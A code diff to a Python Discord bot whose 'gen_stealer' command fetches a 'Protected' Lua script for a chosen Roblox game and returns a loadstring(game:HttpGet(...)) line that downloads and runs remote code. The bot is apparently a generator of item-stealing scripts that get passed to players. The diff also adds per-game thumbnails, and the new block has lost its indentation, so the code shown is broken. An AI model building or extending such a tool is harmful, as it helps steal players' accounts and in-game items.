@@ -53,8 +53,8 @@ class SendFieldValueButton(discord.ui.Button):
 )
 @app_commands.choices(game_type=[
     app_commands.Choice(name="MM2", value="mm2"),
-    app_commands.Choice(name="Adopt Me", value="adoptme"),
     app_commands.Choice(name="PS99", value="ps99"),
+    app_commands.Choice(name="Adopt Me", value="adoptme"),
     app_commands.Choice(name="Pls Donate", value="pls_donate"),
 ])
 async def gen_stealer(
@@ -65,17 +65,22 @@ async def gen_stealer(
 ):
     await interaction.response.defer(ephemeral=True)
     try:
-        if game_type.value == "mm2":
-            url = "https://raw.githubusercontent.com/SharScript/MM2/main/Protected_MM2.lua"
-        elif game_type.value == "ps99":
-            url = "https://raw.githubusercontent.com/SharScript/PS99/main/Protected_PS99.lua"
-        elif game_type.value == "adopt_me":
-            url = "https://raw.githubusercontent.com/SharScript/Adopt-Me/refs/heads/main/Protected_AdoptMe.lua"
-        elif game_type.value == "pls_donate":
-            url = "https://raw.githubusercontent.com/SharScript/Pls-Donate/main/Protected_PlsDonate.lua"
-        else:
-            await interaction.followup.send("Invalid game type selected.", ephemeral=True)
-            return
+if game_type.value == "mm2":
+    url = "https://raw.githubusercontent.com/SharScript/MM2/main/Protected_MM2.lua"
+    thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxOWYkSasIaeBcOEhcVVxfyFxNpU_MtJDP-w&s"
+elif game_type.value == "ps99":
+    url = "https://raw.githubusercontent.com/SharScript/PS99/main/Protected_PS99.lua"
+    thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjoGNsO70eNNdGyz0Ka9h-3Q47xDJQodZVKQ&s"
+elif game_type.value == "adoptme":
+    url = "https://raw.githubusercontent.com/SharScript/Adopt-Me/main/Protected_AdoptMe.lua"
+    thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvcX0YRA4qPdQhPFiQ-Ev3kwHj9wEg6tbh6aH8WFBYATGx573n46-q2FY&s=10"
+elif game_type.value == "pls_donate":
+    url = "https://raw.githubusercontent.com/SharScript/Pls-Donate/main/Protected_PlsDonate.lua"
+    thumbnail_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSk5Bt8OFoAF6gWKk_bpKFH35JregoZL-6pw&s"
+else:
+    await interaction.followup.send("Invalid game type selected.", ephemeral=True)
+    return
+
 
         response = requests.get(url)
         if response.status_code != 200:
@@ -129,7 +134,7 @@ async def gen_stealer(
             )
             embed.add_field(name="Script", value=f'```lua\nloadstring(game:HttpGet("{raw_url}", true))()```', inline=False)
             embed.set_footer(text="Made By Pethical")
-            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1299029863427997777/1372862855715491840/tiktokio.com_CT6hHUPDendSN7vG8p5e.mp4?ex=682851ab&is=6827002b&hm=b851b4e351d4ba68a8af69794a139e3d30f8bfc35e7085cf976921d66d2ae4c6&")
+            embed.set_thumbnail(url=thumbnail_url)
 
             view = discord.ui.View()
             view.add_item(SendFieldValueButton(embed))
